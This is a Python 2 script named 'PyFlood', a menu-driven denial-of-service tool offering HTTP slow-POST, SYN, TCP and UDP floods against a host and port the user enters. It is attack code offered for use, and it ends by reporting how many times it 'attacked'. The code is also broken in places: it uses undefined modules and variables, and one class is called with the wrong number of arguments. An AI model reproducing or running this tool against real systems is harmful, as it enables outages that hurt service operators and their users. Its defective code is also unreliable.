import socket
import random
import sys
import time

running = True
count = 0

class httpDos():
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
		
    def _send_http_post(self, pause=10):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 900\r\n"
                        "Content-Length: 10000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
	
        self.socks.close()

class synFlood():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.syn = socket.socket()
        self.run(ip, port)
    def run(self, ip, port):
        while running:
            try:
                self.syn.connect((ip, port))
                global count; count+=1
            except: pass

class tcpFlood():
    def __init__(self, ip, port, size):
        self.ip = ip
        self.port = int(port)
        self.size = size
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp.connect((ip, port))
        self.run(ip, port, size)
    def run(self, ip, port, size):
        while running:
            try:
                byte = random._urandom(size)
                self.tcp.setblocking(0)
                self.tcp.sendto(byte, (ip, port))
                global count; count+=1
            except:
                pass

class udpFlood():
    def __init__(self, ip, port, size):
        self.ip = ip
        self.port = port
        self.size = size
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.run(ip, port, size)
    def run(self, ip, port, size):
        while running:
            try:
                byte = random._urandom(self.size)
                self.udp.sendto(byte, (self.ip, self.port))
                global count; count+=1
            except:
            	pass

def banner():
	print """
	  ____        _____ _                 _ 
	 |  _ \ _   _|  ___| | ___   ___   __| |
	 | |_) | | | | |_  | |/ _ \ / _ \ / _` |
	 |  __/| |_| |  _| | | (_) | (_) | (_| |
	 |_|    \__, |_|   |_|\___/ \___/ \__,_|
	        |___/                           
			(30/Sept/2015)	Hades.y2k"""

if __name__ == '__main__':
	try:
		banner()
		print """> [1] HTTP DoS
> [2] SYN Flood
> [3] TCP Flood
> [4] UDP Flood"""
		option = input("> Choose Any Options : ")
		while type(option) != int: option = input("Choose Any Options : ")
		if option == 1: #HTTP DOS
			host = raw_input("> Enter The Host : "); port = input("> Port No : ")
			httpDos(host, port)
		elif option == 2: # SYN FLOOD
			ip = raw_input("> Enter IP : "); port = input("> Port No : ")
			synFlood(ip, port)
		elif option == 3: # TCP FLOOD
			ip = raw_input("> Enter IP : "); port = input("> Port No : "); size = input("> Size : ")
			tcpFlood(ip, port, size)
		elif option == 4: # UDP FLOOD
			ip = raw_input("> Enter IP : "); port = input("> Port No : "); size = input("> Size : ")
			udpFlood(ip, port, size)

	except KeyboardInterrupt:
		print "\n[!] Process Interrupted"
		print "Attacked ", count, " times."
		sys.exit(0)
